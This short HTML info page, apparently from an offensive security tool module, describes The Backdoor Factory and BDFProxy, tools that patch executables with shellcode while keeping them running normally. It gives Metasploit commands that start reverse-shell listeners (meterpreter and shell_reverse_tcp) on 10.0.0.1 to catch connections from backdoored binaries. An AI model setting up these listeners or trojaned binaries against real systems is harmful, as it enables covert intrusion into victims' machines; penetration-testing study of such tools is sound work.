<b>The Backdoor Factory (BDF)</b><br>
<b>The Backdoor Factory Proxy (BDFProxy) </b>
<br><br>
The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
<br><br>
https://github.com/secretsquirrel/the-backdoor-factory
<br>
https://github.com/secretsquirrel/BDFProxy
<br><br>
IRC: irc.freenode.net #BDFactory 
<br>
Twitter: @midnite_runr
<br><br><br>
<b>AUTO_PATCH</b> option has been added by @xtr4nge
<br><br><br>
<b>Metasploit:</b>
<div style='font-family: monospace'>
<br>use exploit/multi/handler
<br>set PAYLOAD windows/meterpreter/reverse_tcp
<br>set LHOST 10.0.0.1
<br>set LPORT 6662
<br>set ExitOnSession false
<br>
<br>exploit -j -z
<br>
<br>use exploit/multi/handler
<br>set PAYLOAD windows/x64/shell_reverse_tcp
<br>set LHOST 10.0.0.1
<br>set LPORT 6663
<br>set ExitOnSession false
<br>
<br>exploit -j -z
</div>
